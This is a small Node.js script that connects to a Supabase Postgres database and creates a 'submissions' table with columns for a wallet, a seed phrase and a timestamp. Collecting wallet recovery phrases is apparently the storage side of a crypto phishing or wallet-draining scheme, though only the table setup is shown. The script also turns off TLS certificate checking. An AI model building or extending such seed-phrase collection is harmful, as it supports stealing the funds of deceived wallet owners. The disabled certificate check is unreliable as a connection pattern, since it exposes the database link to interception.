import { Client } from 'pg';
import dotenv from 'dotenv';

dotenv.config();

const password = process.env.SUPABASE_DB_PASSWORD;
const host = process.env.SUPABASE_DB_HOST || 'db.tfkeuiktciczxurlvuct.supabase.co';
const port = Number(process.env.SUPABASE_DB_PORT || '5432');
const database = process.env.SUPABASE_DB_NAME || 'postgres';
const user = process.env.SUPABASE_DB_USER || 'postgres';

if (!password) {
  console.error('Missing SUPABASE_DB_PASSWORD in .env or environment variables.');
  process.exit(1);
}

const client = new Client({
  user,
  password,
  host,
  port,
  database,
  ssl: { rejectUnauthorized: false }
});

const createTableSQL = `
CREATE TABLE IF NOT EXISTS public.submissions (
  id SERIAL PRIMARY KEY,
  wallet TEXT NOT NULL,
  seedPhrase TEXT NOT NULL,
  timestamp BIGINT NOT NULL
);
`;

try {
  await client.connect();
  console.log('Connected to Supabase Postgres. Creating submissions table...');
  await client.query(createTableSQL);
  console.log('Table created or already exists: public.submissions');
} catch (error) {
  console.error('Failed to create table:', error);
  process.exit(1);
} finally {
  await client.end();
}
